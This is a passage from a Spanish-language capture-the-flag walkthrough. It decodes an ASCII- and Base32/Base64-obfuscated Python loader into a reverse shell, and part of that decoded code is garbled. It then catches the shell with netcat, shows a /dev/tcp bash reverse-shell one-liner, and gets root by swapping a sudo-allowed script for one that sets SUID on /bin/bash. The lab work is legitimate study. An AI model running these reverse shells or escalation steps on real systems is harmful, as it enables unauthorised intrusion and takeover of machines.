50 84 67 71 73 89 88 73 87 75 88 71 86 86 85 87 83 67 78 79 66 72 87 79 51 51 72 74 70 66 85 67 90 50 50 73 53 68 68 65 87 75 84 73 69 52 85 83 83 67 78 79 86 82 87 50 86 84 75 77 82 85 87 79 54 67 78 73 82 69 84 65 83 50 82 78 53 84 85 83 81 50 66 77 53 81 86 79 87 76 72 76 74 68 85 77 77 65 75 76 70 74 85 67 79 75 81 75 78 65 87 83 89 50 89 75 90 89 71 73 82 84 89 79 86 69 87 85 51 50 76 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 74 53 69 89 51 75 79 79 78 82 68 71 84 84 77 74 78 66 87 87 83 50 74 73 78 65 87 79 83 75 68 73 70 84 85 83 81 50 67 80 74 83 86 81 84 76 86 76 74 77 71 81 52 68 69 73 78 84 88 79 83 50 82 78 53 84 85 83 81 50 66 77 52 70 69 83 54 75 67 71 66 81 85 79 86 76 72 77 77 90 68 83 50 84 66 71 74 76 68 65 83 75 72 75 74 89 70 85 86 50 82 74 78 69 85 71 81 76 72 74 70 68 86 77 52 51 66 75 53 77 87 79 89 83 72 75 90 50 85 87 82 50 83 78 66 83 69 79 82 76 81 74 70 67 68 65 79 75 74 73 82 65 84 77 81 51 74 73 70 84 85 83 81 50 66 77 53 69 85 71 81 76 72 77 78 87 86 77 77 68 69 76 66 70 72 75 67 83 74 73 90 74 72 83 90 67 88 75 86 70 85 83 81 50 66 77 53 69 85 79 86 84 84 77 77 90 70 75 78 83 68 77 53 88 87 79 83 75 68 73 70 84 85 83 81 50 66 77 53 69 85 81 81 84 90 77 73 90 69 50 90 50 81 75 78 66 72 85 90 67 88 74 74 51 87 71 51 74 90 78 74 78 70 81 84 84 50 74 82 87 69 69 53 84 68 73 53 76 72 75 83 50 72 75 74 85 71 73 82 50 70 79 78 69 85 81 84 84 80 66 74 78 70 79 54 68 84 75 66 76 70 69 54 76 69 75 53 75 88 71 81 51 74 73 70 84 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 87 71 77 50 83 78 78 82 68 71 86 82 81 75 66 77 69 52 77 75 90 78 90 66 72 83 89 82 83 74 90 87 65 85 89 90 84 74 86 50 86 75 82 76 77 75 70 74 70 71 53 51 72 77 77 90 86 69 50 50 50 76 66 70 72 83 85 67 89 74 89 89 86 83 51 83 67 80 70 82 68 69 84 84 77 77 77 90 85 50 53 75 86 73 86 87 70 67 85 83 84 79 53 70 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 66 85 67 90 89 75 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 74 53 71 73 82 50 83 79 66 82 71 85 77 76 50 77 82 76 85 85 53 51 68 78 85 52 87 85 87 83 89 74 90 53 69 89 51 67 67 74 74 75 85 75 86 76 81 73 78 85 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 87 71 77 50 83 78 78 82 68 71 86 82 81 76 65 90 86 85 50 68 67 74 66 76 71 89 83 75 69 71 66 84 87 71 83 67 75 79 89 70 70 83 54 74 86 80 74 83 69 79 85 84 87 77 82 77 70 67 53 76 68 78 86 76 71 81 87 83 68 77 53 89 69 83 81 51 84 77 53 82 85 81 83 84 87 76 70 52 84 75 54 84 69 73 53 74 71 89 89 51 79 74 70 50 87 71 51 75 87 78 66 78 69 71 90 51 81 73 78 85 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 87 71 54 74 86 80 74 78 70 79 78 76 76 74 78 69 69 52 77 67 50 73 52 52 84 67 67 84 69 73 89 52 84 69 87 75 88 80 65 89 86 85 85 51 76 74 78 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 66 72 83 87 83 89 75 73 89 87 71 51 74 85 77 53 74 71 50 82 84 84 77 77 90 70 75 83 50 68 78 86 74 71 89 87 84 74 73 74 50 70 83 86 51 77 79 86 70 85 71 50 90 87 73 78 85 85 67 90 50 74 73 78 66 68 71 89 75 72 78 82 90 86 85 85 50 67 75 86 82 87 52 86 84 77 66 74 72 87 79 51 51 72 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 73 74 90 51 70 83 77 84 85 78 82 83 69 77 79 76 76 77 70 76 86 77 50 50 74 73 81 89 71 79 85 84 78 73 90 90 87 71 77 83 86 74 78 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 66 68 65 89 51 79 78 77 51 69 71 50 75 66 77 53 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 73 74 86 84 81 85 85 67 84 73 74 86 71 69 77 82 86 79 86 78 70 79 84 82 81 74 78 67 87 81 85 67 86 71 70 73 88 71 83 75 71 73 74 73 70 75 51 67 82 79 66 66 87 83 81 76 72 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 85 83 83 68 69 78 53 81 86 79 54 68 77 74 70 68 84 75 53 84 69 73 78 66 72 85 89 82 83 74 90 90 70 85 87 67 83 77 90 78 69 79 51 68 77 76 74 67 71 54 83 89 75 74 70 66 85 67 90 50 74 73 78 65 87 79 83 75 68 73 70 84 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 69 69 52 53 83 90 71 74 50 71 89 90 67 71 72 70 86 87 67 86 50 87 78 78 69 85 73 77 68 72 77 81 90 69 77 52 68 69 73 89 52 87 50 89 82 84 74 74 84 70 83 77 82 90 79 82 82 70 79 82 84 86 76 74 66 87 81 54 83 76 75 70 88 87 79 83 75 68 73 70 84 85 83 81 50 66 77 52 70 69 83 81 50 66 77 53 69 85 71 81 84 50 74 82 87 85 52 52 51 67 71 78 72 71 89 83 50 68 78 78 70 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 66 85 69 51 68 70 73 53 72 71 89 89 50 73 75 70 84 87 71 77 82 90 78 74 81 84 69 86 82 81 74 82 87 86 77 54 76 68 78 85 52 88 83 84 51 72 78 53 84 85 83 81 50 66 77 53 69 85 71 81 76 72 74 70 66 85 67 90 50 74 73 78 66 72 79 67 83 90 76 66 72 72 85 81 51 74 73 70 84 85 83 81 50 66 77 53 69 85 71 81 76 72 77 82 68 87 89 53 67 50 75 77 50 88 85 89 83 72 75 90 87 71 71 81 51 72 71 70 70 86 67 51 50 76 77 70 76 86 83 90 50 89 71 69 52 88 75 87 75 88 71 70 87 70 81 77 74 89 77 53 73 70 73 77 68 72 74 70 87 68 83 90 84 67 75 53 68 72 65 89 84 77 72 70 84 69 83 50 84 80 74 78 69 85 71 81 76 72 66 74 69 85 81 84 82 86 77 78 52 84 75 51 68 70 73 53 87 68 65 83 50 72 71 70 85 71 67 86 90 85 78 53 70 86 71 50 50 76 66 73 61 61 61 61 61 61 39 41 41 41
```

Ahora vamos a crearnos un script que nos decodifique esto a `texto` plano, para enternder el codigo:

> decodeAscii.sh

```bash
#!/bin/bash

# Comprueba si se han proporcionado los argumentos necesarios
if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <archivo_ascii.txt> <archivo_salida.txt>"
    echo "Ejemplo: $0 entrada_ascii.txt salida_texto.txt"
    exit 1
fi

# Archivos de entrada y salida
archivo_ascii="$1"
archivo_salida="$2"

# Comprueba si el archivo de entrada existe
if [ ! -f "$archivo_ascii" ]; then
    echo "El archivo $archivo_ascii no existe."
    exit 1
fi

# Limpia o crea el archivo de salida
> "$archivo_salida"

# Lee cada línea del archivo de entrada, convierte los códigos ASCII y escribe en el archivo de salida
while IFS= read -r linea; do
    # Convierte cada número ASCII a carácter y concatena
    texto=$(echo "$linea" | awk '{for (i=1; i<=NF; i++) printf "%c", $i}')
    echo "$texto" >> "$archivo_salida"
done < "$archivo_ascii"

echo "Conversión completada. El resultado está en $archivo_salida."
```

Lo ejecutaremos de la siguiente forma:

```shell
bash decodeAscii.sh numeros.txt outputfile.txt
```

Info:

```
Conversión completada. El resultado está en outputfile.txt.
```

Y si leemos el codigo decodificado:

```
import base64; exec(base64.b64decode(base64.b32decode('MFLTC53CGNFDASKIJY2WG53QOBRFQQTWMNXFCZ3CGNGUWYKXGF3WEM2KGBEUQTRRLFXEE6LCGJHGYYZTJVFWCVZRO5RDGSRQJFEE45SZGJ2GYZCBOBYGEWCCOYFGG3SRM5SEO3DULJIW6S2TIU4VIVSDIE4USQ2JPBHHUSLVJVKGG5KNIM2HQT2EJVUUG3CCKBKWYULHKBJUCMKNIRAXSQ3HOBVVUV2ZM5MTEOLVMJWVM2TEINUG6CTCGNHDATCDIJ3WEM2KGBFVI32LJFBUCZ2JJBGWOUCTIJ5GEMSOOJNFQULVMMZDS2TBGJLDAS2IJZ3FSMTUNRSEGNKCKJWDSSSUNNLFKTCDIJ5GEMSOOJNFQULVBJKTAOKEKMYTSVCWIZFEMUKVGBYEG2KBM5EUGQT2JRWU45TCNU2WYWJTKFXUWR3IOZRTGULTJFEEE5TDNZIXAS2RN5TUSQ2BM5RW2VRQMRMEU5KJJBGUWQ3NKJWAUWTJIIZVSV3MGBMDEWTWMNWDS2TCGIYXIWKXGVVUWSCNOBHWO33HJFBUCZ22I5DDAWKTIE4USSCNOVRW2VTKMRUWO6CNIRETAS2RN5TUSQ2BM5QVOWLHLJDUMMAKLFJUCOKQKNAWSY2YKZYGIRTYOVEWU32LJFBUCZ2JINAWOSKDIJ5EY3KOONRDGTTMJNBWWS2JINAWOSKDIFTUSQ2CPJSVQTLVLJMGQ4DEINTXOS2RN5TUSQ2BM4FES6KCGBQUOVLHMMZDS2TBGJLDASKHKJYFUV2RJNEUGQLHJFDVM43BK5MWOYSHKZ2UWR2SNBSEORLQJFCDAOKJIRATMQ3JIFTUSQ2BM5EUGQLHMNWVMMDELBFHKCSJIZJHSZCXKVFUSQ2BM5EUOVTTMMZFKNSDM5XWOSKDIFTUSQ2BM5EUQQTZMIZE2Z2QKNBHUZCXJJ3WG3JZNJNFQTT2JRWEE5TDI5LHKS2HKJUGIR2FONEUQTTPBJNFO6DTKBLFE6LEK5KXGQ3JIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTWGM2SNNRDGVRQKBME4MKZNZBHSYRSJZWAUYZTJV2VKRLMKFJFG53HMMZVE222LBFHSUCYJYYVS3SCPFRDETTMMMZU25KVIVWFCUSTO5FUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZYKJFBUCZ2JINAWOSKDIJ5GIR2SOBRGUML2MRLUU53DNU4WUWSYJZ5EY3CCJJKUKVLQINUUCZ2JINAWOSKDIFTWGM2SNNRDGVRQLAZVU2DCJBLGYSKEGBTWGSCKOYFFS6JVPJSEOUTWMRMFC5LDNVLGQWSDM5YESQ3TM5RUQSTWLF4TK6TEI5JGYY3OJF2WG3KWNBNEGZ3QINUUCZ2JINAWOSKDIFTWG6JVPJNFONLLJNEE4MC2I44TCCTEIY4TEWKXPAYVUU3LJNEUGQLHJFBUCZ2JINBHSWSYKIYWG3JUM5JG2RTTMMZFKS2DNVJGYWTJIJ2FSV3MOVFUG2ZWINUUCZ2JINBDGYKHNRZVUU2CKVRW4VTMBJHWO33HJFBUCZ2JINAWOSKIJZ3FSMTUNRSEMOLLMFLVM22JIQYGOUTNIZZWGMSVJNEUGQLHJFBUCZ2JINBDAY3ONM3EG2KBM5EUGQLHJFBUCZ2JINAWOSKIJVTQUUCTIJVGEMRVOVNFOTRQJNCWQUCVGFIXGSKGIJIFK3CROBBWSQLHJFBUCZ2JINAWOSKDIFTUSSDEN5QVO6DMJFDTK5TEINBHUYRSJZZFUWCSMZNEO3DMLJCG6SYKJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFEE45SZGJ2GYZCGHFVWCV2WNNEUIMDHMQZEM4DEIY4W2YRTJJTFSMRZORRFORTVLJBWQ6SLKFXWOSKDIFTUSQ2BM4FESQ2BM5EUGQT2JRWU443CGNHGYS2DNNFUSQ2BM5EUGQLHJFBUE3DFI5HGYY2IKFTWGMRZNJQTEVRQJRWVM6LDNU4XST3HN5TUSQ2BM5EUGQLHJFBUCZ2JINBHOCSZLBHHUQ3JIFTUSQ2BM5EUGQLHMRDWY5C2KM2XUYSHKZWGGQ3HGFFVC32LMFLVSZ2YGE4XKWKXGFWFQMJYM5IFIMDHJFWDSZTCK5DHAYTMHFTES2TPJNEUGQLHBJEUQTRVMN4TK3DFI5WDAS2HGFUGCVZUN5FVG22LBI======')))
```

\===============================================================

> NOTA:

Tambien podremos utilizar la siguiente pagina en tal caso de que no se quiera crear un script:

URL = [Decode Ascii a Texto](https://seostudio.tools/es/ascii-to-text)

\===============================================================

Vemos que el codigo nos lo esta proporcionando en `Base64` y `Base32` por lo que vamos a probar a decodificarlo, creando el siguiente script de `python3` super simple:

> decodeBases.py

```python
import base64

# Cadena codificada
encoded_string = 'MFLTC53CGNFDASKIJY2WG53QOBRFQQTWMNXFCZ3CGNGUWYKXGF3WEM2KGBEUQTRRLFXEE6LCGJHGYYZTJVFWCVZRO5RDGSRQJFEE45SZGJ2GYZCBOBYGEWCCOYFGG3SRM5SEO3DULJIW6S2TIU4VIVSDIE4USQ2JPBHHUSLVJVKGG5KNIM2HQT2EJVUUG3CCKBKWYULHKBJUCMKNIRAXSQ3HOBVVUV2ZM5MTEOLVMJWVM2TEINUG6CTCGNHDATCDIJ3WEM2KGBFVI32LJFBUCZ2JJBGWOUCTIJ5GEMSOOJNFQULVMMZDS2TBGJLDAS2IJZ3FSMTUNRSEGNKCKJWDSSSUNNLFKTCDIJ5GEMSOOJNFQULVBJKTAOKEKMYTSVCWIZFEMUKVGBYEG2KBM5EUGQT2JRWU45TCNU2WYWJTKFXUWR3IOZRTGULTJFEEE5TDNZIXAS2RN5TUSQ2BM5RW2VRQMRMEU5KJJBGUWQ3NKJWAUWTJIIZVSV3MGBMDEWTWMNWDS2TCGIYXIWKXGVVUWSCNOBHWO33HJFBUCZ22I5DDAWKTIE4USSCNOVRW2VTKMRUWO6CNIRETAS2RN5TUSQ2BM5QVOWLHLJDUMMAKLFJUCOKQKNAWSY2YKZYGIRTYOVEWU32LJFBUCZ2JINAWOSKDIJ5EY3KOONRDGTTMJNBWWS2JINAWOSKDIFTUSQ2CPJSVQTLVLJMGQ4DEINTXOS2RN5TUSQ2BM4FES6KCGBQUOVLHMMZDS2TBGJLDASKHKJYFUV2RJNEUGQLHJFDVM43BK5MWOYSHKZ2UWR2SNBSEORLQJFCDAOKJIRATMQ3JIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTWGM2SNNRDGVRQKBME4MKZNZBHSYRSJZWAUYZTJV2VKRLMKFJFG53HMMZVE222LBFHSUCYJYYVS3SCPFRDETTMMMZU25KVIVWFCUSTO5FUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZYKJFBUCZ2JINAWOSKDIJ5GIR2SOBRGUML2MRLUU53DNU4WUWSYJZ5EY3CCJJKUKVLQINUUCZ2JINAWOSKDIFTWG6JVPJNFONLLJNEE4MC2I44TCCTEIY4TEWKXPAYVUU3LJNEUGQLHJFBUCZ2JINBHSWSYKIYWG3JUM5JG2RTTMMZFKS2DNVJGYWTJIJ2FSV3MOVFUG2ZWINUUCZ2JINBDGYKHNRZVUU2CKVRW4VTMBJHWO33HJFBUCZ2JINAWOSKIJZ3FSMTUNRSEMOLLMFLVM22JIQYGOUTNIZZWGMSVJNEUGQLHJFBUCZ2JINBDAY3ONM3EG2KBM5EUGQLHJFBUCZ2JINAWOSKIJVTQUUCTIJVGEMRVOVNFOTRQJNCWQUCVGFIXGSKGIJIFK3CROBBWSQLHJFBUCZ2JINAWOSKDIFTUSSDEN5QVO6DMJFDTK5TEINBHUYRSJZZFUWCSMZNEO3DMLJCG6SYKJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFEE45SZGJ2GYZCGHFVWCV2WNNEUIMDHMQZEM4DEIY4W2YRTJJTFSMRZORRFORTVLJBWQ6SLKFXWOSKDIFTUSQ2BM4FESQ2BM5EUGQT2JRWU443CGNHGYS2DNNFUSQ2BM5EUGQLHJFBUE3DFI5HGYY2IKFTWGMRZNJQTEVRQJRWVM6LDNU4XST3HN5TUSQ2BM5EUGQLHJFBUCZ2JINBHOCSZLBHHUQ3JIFTUSQ2BM5EUGQLHMRDWY5C2KM2XUYSHKZWGGQ3HGFFVC32LMFLVSZ2YGE4XKWKXGFWFQMJYM5IFIMDHJFWDSZTCK5DHAYTMHFTES2TPJNEUGQLHBJEUQTRVMN4TK3DFI5WDAS2HGFUGCVZUN5FVG22LBI======'

# Decodifica la cadena primero de Base32 y luego de Base64
decoded_data = base64.b64decode(base64.b32decode(encoded_string))

# Muestra el resultado
print(decoded_data.decode('utf-8'))
```

Lo utilizamos de la siguiente forma:

```shell
python3 decodeBases.py
```

Info:

```python
import sys
import os
import subprocess
import socket
import time

HOST = "172.17.0.183"
PORT = 5002

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    if data == "quit\n":
        s.close()
        sys.exit(0)
    # the socket died
    elif len(data) == 0:
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        s.send(stdout_value)
        return False

def main():
    while True:
        socket_died = False
        try:
            s = connect(HOST, PORT)
            while not socket_died:
                socket_died = wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    sys.exit(main())
```

Vemos que el codigo de `shell.py` esta haciendo una `reverse shell` hacia un puerto e IP en concreto, por lo que tendremos que cambiar nuestra `IP` por la del script y escuchar en dicho puerto.

En nuestra maquina `host` haremos lo siguiente:

```shell
sudo ip addr add 172.17.0.183/16 dev docker0
```

Ahora si vemos que `IP` tenemos:

```shell
ip addr show docker0
```

Info:

```
ip addr show docker0
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:12:3e:c2:85 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet 172.17.0.183/16 scope global secondary docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:12ff:fe3e:c285/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
```

Vemos que ahora tenemos 2 `IP's`, por lo que ha funcionado añadiendo la `IP` del script, por lo que si ahora nos ponemos a la escucha:

```shell
nc -lvnp 5002
```

Y en la maquina victima ejecutamos lo siguiente:

```shell
sudo -u juan /usr/bin/python3 /home/juan/shell.py
```

Si nos volvemos a la escucha veremos lo siguiente:

```
listening on [any] 5002 ...
connect to [172.17.0.183] from (UNKNOWN) [172.17.0.2] 47014
whoami
juan
```

Por lo que vemos ha funcionado y seremos el usuario `juan`.

## Escalate Privileges

Cuando pasa un rato vemos que nos echa de la `shell` por lo que vamos a ponernos de nuevo a la escucha:

```shell
nc -lvnp 5002
```

Y en la maquina victima ejecutamos otra vez esto:

```shell
sudo -u juan /usr/bin/python3 /home/juan/shell.py
```

Volviendo a la escucha, veremos que obtenemos de nuevo la `shell` pero esta vez rapidamente vamos a ejecutar de forma seguida lo siguiente con el usuario `juan`:

```shell
/bin/bash -c "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

Pero antes de enviarlo nos pondremos a la escucha sobre dicho puerto que vamos a enviar:

```shell
nc -lvnp <PORT>
```

Y cuando ejecutemos lo anterior si volvemos a donde estabamos escuchando, veremos que hemos obtenido una `shell` con el mismo usuario `juan` pero esta vez no nos echara.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for juan on 3c279e99f11b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User juan may run the following commands on 3c279e99f11b:
    (ALL : ALL) NOPASSWD: /home/juan/mensajes.sh
```

Vemos que podemos ejecutar el script `mensajes.sh` como el usuario `root`, por lo que haremos lo siguiente:

Si vemos donde esta ubicado el archivo, vemos que esta en nuestra `home` por lo que podremos eliminar el archivo y crear uno llamado de la misma forma para poner con permisos `SUID` la `bash`.

```shell
rm /home/juan/mensajes.sh
```

Una vez que lo hayamos eliminado, crearemos el mismo archivo con esto dentro:

```shell
nano /home/juan/mensajes.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y le damos permisos de ejecuccion:

```shell
chmod +x /home/juan/mensajes.sh
```

Una vez echo todo esto, lo ejecutaremos como el usuario `root`.

```shell
sudo /home/juan/mensajes.sh
```

Ahora si listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Vemos que ha funcionado por lo que haremos lo siguiente:

```shell
bash -p
```

Y con esto ya seremos `root`.
